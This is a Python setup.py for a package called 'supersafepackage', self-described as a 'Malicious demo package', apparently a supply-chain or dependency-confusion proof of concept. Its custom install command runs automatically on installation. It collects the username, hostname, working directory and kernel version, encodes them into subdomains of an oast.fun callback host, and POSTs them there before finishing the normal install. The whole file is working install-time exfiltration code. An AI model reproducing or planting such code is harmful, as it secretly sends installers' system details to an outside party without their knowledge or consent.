import os
import getpass
import socket
import json
import base64
import http.client
from setuptools import setup, find_packages
from setuptools.command.install import install

# Base64 URL-safe encode function
def b64safe(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

# Custom malicious install command
class MaliciousInstall(install):
    def run(self):
        user = getpass.getuser()
        host = socket.gethostname()
        cwd = os.getcwd()

        # Safely execute 'uname -r'
        uname = os.popen("uname -r").read().strip()

        # Prepare payload
        payload = {
            "cwd": cwd,
            "package": "supersafepackage",
            "version": "4.0.1",
            "hostname": host,
            "uname": uname,
            "whoami": user
        }

        # JSON + base64 encode pieces for DNS-safe subdomain
        data = json.dumps(payload)
        body = data.encode()

        encoded_host = b64safe(host)
        encoded_user = b64safe(user)
        encoded_uname = b64safe(uname)

        # Subdomain with encoded values
        listener_domain = f"{encoded_host}.{encoded_user}.{encoded_uname}.dbwgovzrtoclyqrugbqemngeuq7ougpo7.oast.fun"

        try:
            conn = http.client.HTTPConnection(listener_domain, 80)
            conn.request("POST", "/", body, {
                "Content-Type": "application/json",
                "Content-Length": str(len(body))
            })
            conn.close()
        except Exception as e:
            print(f"[!] Error sending data: {e}")

        # Continue normal install
        install.run(self)

# Setup config
setup(
    name='supersafepackage',
    version='4.0.1',
    description='Malicious demo package',
    packages=find_packages(),
    cmdclass={'install': MaliciousInstall},
)
